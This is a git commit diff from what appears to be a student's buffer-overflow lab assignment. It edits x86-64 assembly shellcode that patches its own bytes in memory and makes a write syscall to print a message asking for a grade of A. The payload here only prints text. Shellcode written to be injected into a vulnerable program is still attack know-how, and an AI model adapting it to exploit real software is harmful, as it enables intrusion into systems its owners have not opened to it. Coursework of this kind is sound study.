efb9c935e9e7755f913a55c346e82d4a86c79709
Yeeva Chunnanond <xaq7pj@virginia.edu>
2026-02-26 20:49:39 -0500

    finished over

--- OVER/input.s
+++ OVER/input.s
@@ -1,13 +1,28 @@
 shellcode:
     jmp afterString
 string:
-    .ascii "Thank you, XXXXX.  I recommend that you get a grade of A on this assignment."
+    .ascii "Thank you, Yeeva. I recommend that you get a grade of A on this assignment. "
 afterString:
+    xor %ebx, %ebx
+    xor %rdi, %rdi
+    xor %rcx, %rcx
+    movb $9, %dil
+loop:
+    cmp %rdi, %rcx
+    jg afterLoop  
+    add $5, %rcx
+    jmp loop
+afterLoop:
+    xor %r8, %r8
+    lea -0x5b(%rip), %r8
+    movb %cl, (%r8)
+    lea -0x2b(%rip), %r8 
+    movb %cl, (%r8)
     xor %eax, %eax
     movb $1, %al 
     xor %rdi, %rdi
     movb $1, %dil 
-    lea -0x5d(%rip), %rsi
+    lea -0x8a(%rip), %rsi 
     movb $76, %dl
     syscall
     xor %eax, %eax
